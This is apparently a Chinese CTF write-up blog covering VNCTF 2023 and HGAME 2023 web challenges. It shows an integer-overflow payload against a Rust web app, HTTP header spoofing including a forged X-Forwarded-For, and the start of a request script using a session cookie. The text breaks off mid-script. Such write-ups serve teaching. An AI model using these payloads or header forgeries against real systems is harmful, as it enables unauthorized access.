]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(![]+[+[]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]]+![]+(![]+[+[]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]])()[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[+[]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]])+[])[+!+[]])+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()[+!+[]+[!+[]+!+[]]])())<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;很遗憾，你输了！&quot;</span>);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这些符号是被编码过的，直接复制到控制台解码得到flag<code>flag&#123;w3lc0m3_t0_VNCTF_2023~~~&#125;</code></p><h3 id="电子木鱼"><a class="markdownIt-Anchor" href="#电子木鱼"></a> 电子木鱼</h3><p>先下源码，是一个rust 语言编写的</p><p>看到 <code>main.rs</code></p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">use</span> actix_files::Files;<br><span class="hljs-keyword">use</span> actix_web::&#123;<br>    error, get, post,<br>    web::&#123;<span class="hljs-keyword">self</span>, Json&#125;,<br>    App, Error, HttpResponse, HttpServer,<br>&#125;;<br><span class="hljs-keyword">use</span> once_cell::sync::Lazy;<br><span class="hljs-keyword">use</span> serde::&#123;Deserialize, Serialize&#125;;<br><span class="hljs-keyword">use</span> std::sync::&#123;Arc, Mutex&#125;;<br><span class="hljs-keyword">use</span> tera::&#123;Context, Tera&#125;;<br><br><span class="hljs-keyword">static</span> GONGDE: Lazy&lt;ThreadLocker&lt;<span class="hljs-type">i32</span>&gt;&gt; = Lazy::<span class="hljs-title function_ invoke__">new</span>(|| ThreadLocker::<span class="hljs-title function_ invoke__">from</span>(<span class="hljs-number">0</span>));<br><br><span class="hljs-meta">#[derive(Debug, Clone, Default)]</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">ThreadLocker</span>&lt;T&gt; &#123;<br>    value: Arc&lt;Mutex&lt;T&gt;&gt;,<br>&#125;<br><br><span class="hljs-keyword">impl</span>&lt;T: <span class="hljs-built_in">Clone</span>&gt; ThreadLocker&lt;T&gt; &#123;<br>    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">get</span>(&amp;<span class="hljs-keyword">self</span>) <span class="hljs-punctuation">-&gt;</span> T &#123;<br>        <span class="hljs-keyword">let</span> <span class="hljs-variable">mutex</span> = <span class="hljs-keyword">self</span>.value.<span class="hljs-title function_ invoke__">lock</span>().<span class="hljs-title function_ invoke__">unwrap</span>();<br>        mutex.<span class="hljs-title function_ invoke__">clone</span>()<br>    &#125;<br>    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">set</span>(&amp;<span class="hljs-keyword">self</span>, val: T) &#123;<br>        <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">mutex</span> = <span class="hljs-keyword">self</span>.value.<span class="hljs-title function_ invoke__">lock</span>().<span class="hljs-title function_ invoke__">unwrap</span>();<br>        *mutex = val;<br>    &#125;<br>    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">from</span>(val: T) <span class="hljs-punctuation">-&gt;</span> ThreadLocker&lt;T&gt; &#123;<br>        ThreadLocker::&lt;T&gt; &#123;<br>            value: Arc::<span class="hljs-title function_ invoke__">new</span>(Mutex::<span class="hljs-title function_ invoke__">new</span>(val)),<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">#[derive(Serialize)]</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">APIResult</span> &#123;<br>    success: <span class="hljs-type">bool</span>,<br>    message: &amp;<span class="hljs-symbol">&#x27;static</span> <span class="hljs-type">str</span>,<br>&#125;<br><br><span class="hljs-meta">#[derive(Deserialize)]</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Info</span> &#123;<br>    name: <span class="hljs-type">String</span>,<br>    quantity: <span class="hljs-type">i32</span>,<br>&#125;<br><br><span class="hljs-meta">#[derive(Debug, Copy, Clone, Serialize)]</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Payload</span> &#123;<br>    name: &amp;<span class="hljs-symbol">&#x27;static</span> <span class="hljs-type">str</span>,<br>    cost: <span class="hljs-type">i32</span>,<br>&#125;<br><br><span class="hljs-keyword">const</span> PAYLOADS: &amp;[Payload] = &amp;[<br>    Payload &#123;<br>        name: <span class="hljs-string">&quot;Cost&quot;</span>,<br>        cost: <span class="hljs-number">10</span>,<br>    &#125;,<br>    Payload &#123;<br>        name: <span class="hljs-string">&quot;Loan&quot;</span>,<br>        cost: -<span class="hljs-number">1_000</span>,<br>    &#125;,<br>    Payload &#123;<br>        name: <span class="hljs-string">&quot;CCCCCost&quot;</span>,<br>        cost: <span class="hljs-number">500</span>,<br>    &#125;,<br>    Payload &#123;<br>        name: <span class="hljs-string">&quot;Donate&quot;</span>,<br>        cost: <span class="hljs-number">1</span>,<br>    &#125;,<br>    Payload &#123;<br>        name: <span class="hljs-string">&quot;Sleep&quot;</span>,<br>        cost: <span class="hljs-number">0</span>,<br>    &#125;,<br>];<br><br><span class="hljs-meta">#[get(<span class="hljs-string">&quot;/&quot;</span>)]</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">index</span>(tera: web::Data&lt;Tera&gt;) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">Result</span>&lt;HttpResponse, Error&gt; &#123;<br>    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">context</span> = Context::<span class="hljs-title function_ invoke__">new</span>();<br><br>    context.<span class="hljs-title function_ invoke__">insert</span>(<span class="hljs-string">&quot;gongde&quot;</span>, &amp;GONGDE.<span class="hljs-title function_ invoke__">get</span>());<br><br>    <span class="hljs-keyword">if</span> GONGDE.<span class="hljs-title function_ invoke__">get</span>() &gt; <span class="hljs-number">1_000_000_000</span> &#123;<br>        context.<span class="hljs-title function_ invoke__">insert</span>(<br>            <span class="hljs-string">&quot;flag&quot;</span>,<br>            &amp;std::env::<span class="hljs-title function_ invoke__">var</span>(<span class="hljs-string">&quot;FLAG&quot;</span>).<span class="hljs-title function_ invoke__">unwrap_or_else</span>(|_| <span class="hljs-string">&quot;flag&#123;test_flag&#125;&quot;</span>.<span class="hljs-title function_ invoke__">to_string</span>()),  <span class="hljs-comment">//这里出flag</span><br>        );<br>    &#125;<br><br>    <span class="hljs-keyword">match</span> tera.<span class="hljs-title function_ invoke__">render</span>(<span class="hljs-string">&quot;index.html&quot;</span>, &amp;context) &#123;<br>        <span class="hljs-title function_ invoke__">Ok</span>(body) =&gt; <span class="hljs-title function_ invoke__">Ok</span>(HttpResponse::<span class="hljs-title function_ invoke__">Ok</span>().<span class="hljs-title function_ invoke__">body</span>(body)),<br>        <span class="hljs-title function_ invoke__">Err</span>(err) =&gt; <span class="hljs-title function_ invoke__">Err</span>(error::<span class="hljs-title function_ invoke__">ErrorInternalServerError</span>(err)),<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">#[get(<span class="hljs-string">&quot;/reset&quot;</span>)]</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">reset</span>() <span class="hljs-punctuation">-&gt;</span> Json&lt;APIResult&gt; &#123;<br>    GONGDE.<span class="hljs-title function_ invoke__">set</span>(<span class="hljs-number">0</span>);<br>    web::<span class="hljs-title function_ invoke__">Json</span>(APIResult &#123;<br>        success: <span class="hljs-literal">true</span>,<br>        message: <span class="hljs-string">&quot;重开成功，继续挑战佛祖吧&quot;</span>,<br>    &#125;)<br>&#125;<br><br><span class="hljs-meta">#[post(<span class="hljs-string">&quot;/upgrade&quot;</span>)]</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">upgrade</span>(body: web::Form&lt;Info&gt;) <span class="hljs-punctuation">-&gt;</span> Json&lt;APIResult&gt; &#123;<br>    <span class="hljs-keyword">if</span> GONGDE.<span class="hljs-title function_ invoke__">get</span>() &lt; <span class="hljs-number">0</span> &#123;<br>        <span class="hljs-keyword">return</span> web::<span class="hljs-title function_ invoke__">Json</span>(APIResult &#123;<br>            success: <span class="hljs-literal">false</span>,<br>            message: <span class="hljs-string">&quot;功德都搞成负数了，佛祖对你很失望&quot;</span>,<br>        &#125;);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> body.quantity &lt;= <span class="hljs-number">0</span> &#123;<br>        <span class="hljs-keyword">return</span> web::<span class="hljs-title function_ invoke__">Json</span>(APIResult &#123;<br>            success: <span class="hljs-literal">false</span>,<br>            message: <span class="hljs-string">&quot;佛祖面前都敢作弊，真不怕遭报应啊&quot;</span>,<br>        &#125;);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> <span class="hljs-variable">Some</span>(payload) = PAYLOADS.<span class="hljs-title function_ invoke__">iter</span>().<span class="hljs-title function_ invoke__">find</span>(|u| u.name == body.name) &#123;<br>        <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">cost</span> = payload.cost;<br><br>        <span class="hljs-keyword">if</span> payload.name == <span class="hljs-string">&quot;Donate&quot;</span> || payload.name == <span class="hljs-string">&quot;Cost&quot;</span> &#123;<br>            cost *= body.quantity;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> GONGDE.<span class="hljs-title function_ invoke__">get</span>() &lt; cost <span class="hljs-keyword">as</span> <span class="hljs-type">i32</span> &#123;<br>            <span class="hljs-keyword">return</span> web::<span class="hljs-title function_ invoke__">Json</span>(APIResult &#123;<br>                success: <span class="hljs-literal">false</span>,<br>                message: <span class="hljs-string">&quot;功德不足&quot;</span>,<br>            &#125;);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> cost != <span class="hljs-number">0</span> &#123;<br>            GONGDE.<span class="hljs-title function_ invoke__">set</span>(GONGDE.<span class="hljs-title function_ invoke__">get</span>() - cost <span class="hljs-keyword">as</span> <span class="hljs-type">i32</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> payload.name == <span class="hljs-string">&quot;Cost&quot;</span> &#123;<br>            <span class="hljs-keyword">return</span> web::<span class="hljs-title function_ invoke__">Json</span>(APIResult &#123;<br>                success: <span class="hljs-literal">true</span>,<br>                message: <span class="hljs-string">&quot;小扣一手功德&quot;</span>,<br>            &#125;);<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> payload.name == <span class="hljs-string">&quot;CCCCCost&quot;</span> &#123;<br>            <span class="hljs-keyword">return</span> web::<span class="hljs-title function_ invoke__">Json</span>(APIResult &#123;<br>                success: <span class="hljs-literal">true</span>,<br>                message: <span class="hljs-string">&quot;功德都快扣没了，怎么睡得着的&quot;</span>,<br>            &#125;);<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> payload.name == <span class="hljs-string">&quot;Loan&quot;</span> &#123;<br>            <span class="hljs-keyword">return</span> web::<span class="hljs-title function_ invoke__">Json</span>(APIResult &#123;<br>                success: <span class="hljs-literal">true</span>,<br>                message: <span class="hljs-string">&quot;我向佛祖许愿，佛祖借我功德，快说谢谢佛祖&quot;</span>,<br>            &#125;);<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> payload.name == <span class="hljs-string">&quot;Donate&quot;</span> &#123;<br>            <span class="hljs-keyword">return</span> web::<span class="hljs-title function_ invoke__">Json</span>(APIResult &#123;<br>                success: <span class="hljs-literal">true</span>,<br>                message: <span class="hljs-string">&quot;好人有好报&quot;</span>,<br>            &#125;);<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> payload.name == <span class="hljs-string">&quot;Sleep&quot;</span> &#123;<br>            <span class="hljs-keyword">return</span> web::<span class="hljs-title function_ invoke__">Json</span>(APIResult &#123;<br>                success: <span class="hljs-literal">true</span>,<br>                message: <span class="hljs-string">&quot;这是什么？床，睡一下&quot;</span>,<br>            &#125;);<br>        &#125;<br>    &#125;<br><br>    web::<span class="hljs-title function_ invoke__">Json</span>(APIResult &#123;<br>        success: <span class="hljs-literal">false</span>,<br>        message: <span class="hljs-string">&quot;禁止开摆&quot;</span>,<br>    &#125;)<br>&#125;<br><br><span class="hljs-meta">#[actix_web::main]</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() <span class="hljs-punctuation">-&gt;</span> std::io::<span class="hljs-type">Result</span>&lt;()&gt; &#123;<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">port</span> = std::env::<span class="hljs-title function_ invoke__">var</span>(<span class="hljs-string">&quot;PORT&quot;</span>)<br>        .<span class="hljs-title function_ invoke__">unwrap_or_else</span>(|_| <span class="hljs-string">&quot;2333&quot;</span>.<span class="hljs-title function_ invoke__">to_string</span>())<br>        .<span class="hljs-title function_ invoke__">parse</span>()<br>        .<span class="hljs-title function_ invoke__">expect</span>(<span class="hljs-string">&quot;Invalid PORT&quot;</span>);<br><br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;Listening on 0.0.0.0:&#123;&#125;&quot;</span>, port);<br><br>    HttpServer::<span class="hljs-title function_ invoke__">new</span>(<span class="hljs-keyword">move</span> || &#123;<br>        <span class="hljs-keyword">let</span> <span class="hljs-variable">tera</span> = <span class="hljs-keyword">match</span> Tera::<span class="hljs-title function_ invoke__">new</span>(<span class="hljs-string">&quot;src/templates/**/*.html&quot;</span>) &#123;<br>            <span class="hljs-title function_ invoke__">Ok</span>(t) =&gt; t,<br>            <span class="hljs-title function_ invoke__">Err</span>(e) =&gt; &#123;<br>                <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;Error: &#123;&#125;&quot;</span>, e);<br>                ::std::process::<span class="hljs-title function_ invoke__">exit</span>(<span class="hljs-number">1</span>);<br>            &#125;<br>        &#125;;<br>        App::<span class="hljs-title function_ invoke__">new</span>()<br>            .<span class="hljs-title function_ invoke__">app_data</span>(web::Data::<span class="hljs-title function_ invoke__">new</span>(tera))<br>            .<span class="hljs-title function_ invoke__">service</span>(Files::<span class="hljs-title function_ invoke__">new</span>(<span class="hljs-string">&quot;/asset&quot;</span>, <span class="hljs-string">&quot;src/templates/asset/&quot;</span>).<span class="hljs-title function_ invoke__">prefer_utf8</span>(<span class="hljs-literal">true</span>))<br>            .<span class="hljs-title function_ invoke__">service</span>(index)<br>            .<span class="hljs-title function_ invoke__">service</span>(upgrade)<br>            .<span class="hljs-title function_ invoke__">service</span>(reset)<br>    &#125;)<br>    .<span class="hljs-title function_ invoke__">bind</span>((<span class="hljs-string">&quot;0.0.0.0&quot;</span>, port))?<br>    .<span class="hljs-title function_ invoke__">run</span>()<br>    .<span class="hljs-keyword">await</span><br>&#125;<br><br></code></pre></td></tr></table></figure><p>当<code>GONGDE&gt;1000000000</code>时，访问/就可以出flag，所以现在就是要加功德</p><p>这个就想起之前做的溢出</p><p>看到quantity用的是i32数据类型，查一下i32数据范围</p><img src="/2023/02/19/VNCTF2023/1.png" class=""><p>再看到<code>/upgrade</code>发现</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> <span class="hljs-variable">Some</span>(payload) = PAYLOADS.<span class="hljs-title function_ invoke__">iter</span>().<span class="hljs-title function_ invoke__">find</span>(|u| u.name == body.name) &#123;<br>       <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">cost</span> = payload.cost;<br><br>       <span class="hljs-keyword">if</span> payload.name == <span class="hljs-string">&quot;Donate&quot;</span> || payload.name == <span class="hljs-string">&quot;Cost&quot;</span> &#123;<br>           cost *= body.quantity;<br>       &#125;<br></code></pre></td></tr></table></figure><p>这里可以改变cost，从而改变<code>GONGDE</code>,因此可以构造payload:<code>name=Cost&amp;quantity=214748365</code></p><img src="/2023/02/19/VNCTF2023/2.png" class="">]]></content>
    
    
    <categories>
      
      <category>WP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HGAME</title>
    <link href="/2023/01/05/HGAME/"/>
    <url>/2023/01/05/HGAME/</url>
    
    <content type="html"><![CDATA[<h2 id="week-1"><a class="markdownIt-Anchor" href="#week-1"></a> Week 1</h2><h3 id="sign-in"><a class="markdownIt-Anchor" href="#sign-in"></a> Sign In</h3><p>签到题</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br>flag=<span class="hljs-string">&quot;aGdhbWV7V2VsY29tZV9Ub19IR0FNRTIwMjMhfQ==&quot;</span><br><span class="hljs-built_in">print</span>(base64.b64decode(flag))<br><span class="hljs-comment">#b&#x27;hgame&#123;Welcome_To_HGAME2023!&#125;&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="classic-childhood-game"><a class="markdownIt-Anchor" href="#classic-childhood-game"></a> Classic Childhood Game</h3><p>打开题目是个游戏，先随便玩玩</p><p>这种题就是前端JS，玩腻了直接看源码</p><p>在文件<code>./Res/Events.js</code>拉到最下面有一个变量a是unicode编码</p><p><code>\x59\x55\x64\x6b\x61\x47\x4a\x58\x56\x6a\x64\x61\x62\x46\x5a\x31\x59\x6d\x35\x73\x53\x31\x6c\x59\x57\x6d\x68\x6a\x4d\x6b\x35\x35\x59\x56\x68\x43\x4d\x45\x70\x72\x57\x6a\x46\x69\x62\x54\x55\x31\x56\x46\x52\x43\x4d\x46\x6c\x56\x59\x7a\x42\x69\x56\x31\x59\x35</code></p><p>直接到Python解码</p><img src="/2023/01/05/HGAME/3.png" class=""><h3 id="become-a-member"><a class="markdownIt-Anchor" href="#become-a-member"></a> Become A Member</h3><p>考察HTTP请求头</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-number">1</span>.请先提供一下身份证明（<span class="hljs-title class_">Cute</span>-<span class="hljs-title class_">Bunny</span>）哦    <span class="hljs-title class_">User</span>-<span class="hljs-title class_">Agent</span><span class="hljs-symbol">:Cute-Bunny</span><br><span class="hljs-number">2</span>.每一个能够成为会员的顾客们都应该持有名为<span class="hljs-title class_">Vidar</span>的邀请码（code）    <span class="hljs-title class_">Cookie</span><span class="hljs-symbol">:code=Vidar</span><br><span class="hljs-number">3</span>.由于特殊原因，我们只接收来自于bunnybunnybunny.com的会员资格申请<span class="hljs-symbol">referer:</span>bunnybunnybunny.com<br><span class="hljs-number">4</span>.就差最后一个本地的请求，就能拿到会员账号啦X-forwarded-<span class="hljs-symbol">for:</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><br><span class="hljs-number">5</span>.<span class="hljs-symbol">username:</span>luckytoday <span class="hljs-symbol">password:</span>happy123(请以json请求方式登陆)&#123;<span class="hljs-string">&quot;username&quot;</span><span class="hljs-symbol">:<span class="hljs-string">&quot;luckytoday&quot;</span></span>,<span class="hljs-string">&quot;password&quot;</span><span class="hljs-symbol">:<span class="hljs-string">&quot;happy123&quot;</span></span>&#125;<br></code></pre></td></tr></table></figure><img src="/2023/01/05/HGAME/6.png" class=""><h3 id="guess-who-i-am"><a class="markdownIt-Anchor" href="#guess-who-i-am"></a> Guess Who I Am</h3><p>这个题是要写脚本回答100个问题</p><p>查看页面源码给了hint: <a href="https://github.com/Potat0000/Vidar-Website/blob/master/src/scripts/config/member.js">https://github.com/Potat0000/Vidar-Website/blob/master/src/scripts/config/member.js</a></p><p>访问得到答案库</p><p>把答案考到本地</p><p>接着写Python脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://week-1.hgame.lwsec.cn:32380&quot;</span><br>url1 = <span class="hljs-string">&quot;http://week-1.hgame.lwsec.cn:32380/api/getQuestion&quot;</span><br>url2 = <span class="hljs-string">&quot;http://week-1.hgame.lwsec.cn:32380/api/getScore&quot;</span><br>Cookie=<span class="hljs-string">&quot;session=MTY3MjkzNzc4MHxEdi1CQkFFQ180SUFBUkFCRUFBQVBQLUNBQUlHYzNSeWFXNW5EQWdBQm5OdmJIWmxaQU5wYm5RRUFnQUVCbk4wY21sdVp3d05BQXRqYUdGc2JHVnVaMlZKWkFOcGJuUUVBd0Rfb2c9PXyjkMJVTSpoY_gUdzTPAsOafTVVHnJtDE4aemtvw51VCw==&quot;</span><br><span class="hljs-comment"># resp = requests.get(url)</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">110</span>):<br>    resp1 = requests.get(url1,headers=&#123;<span class="hljs-string">&quot;Cookie&quot;</span>:Cookie&#125;)<br>    resp2 = requests.get(url2,headers=&#123;<span class="hljs-string">&quot;Cookie&quot;</span>:Cookie&#125;)<br>    text1 = resp1.text<br>    text1 = text1[text1.index(<span class="hljs-string">&quot;:&quot;</span>) + <span class="hljs-number">1</span>:-<span class="hljs-number">1</span>]<br>    